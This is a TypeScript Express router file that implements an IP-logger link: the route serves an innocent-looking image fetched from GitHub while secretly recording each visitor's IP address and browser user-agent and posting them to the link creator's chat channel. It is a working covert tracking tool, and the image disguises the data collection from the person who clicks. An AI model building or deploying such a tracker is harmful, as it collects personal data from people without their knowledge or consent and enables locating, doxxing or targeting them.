import axios from 'axios';
import express from 'express';
import { ipLoggerService } from '../client/features/ip-logger-service';

const featuresRouter = express.Router();

featuresRouter.get('/ip-logger/:slug', async (req, res) => {
  // res.redirect(
  //   'https://github.com/user-attachments/assets/2d54d27d-dc4b-49c3-807a-7c6bce3023a6'
  // );

  const imageUrl =
    'https://github.com/user-attachments/assets/2d54d27d-dc4b-49c3-807a-7c6bce3023a6';
  const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });

  res.set('Content-Type', response.headers['content-type']);
  res.send(response.data);

  const [id, seed] = req.params.slug.split('-');
  const ip =
    req.headers['x-forwarded-for']?.toString()?.split(',')[0]?.trim() ||
    req.ip ||
    req.connection?.remoteAddress ||
    '';

  const userAgent = req.headers['user-agent'] || 'Unknown';

  const channel = ipLoggerService.getChannel(id);

  if (channel) {
    channel.sendChat(`IP: ${ip}\nUser-Agent: ${userAgent}`);
  }
});

export { featuresRouter };
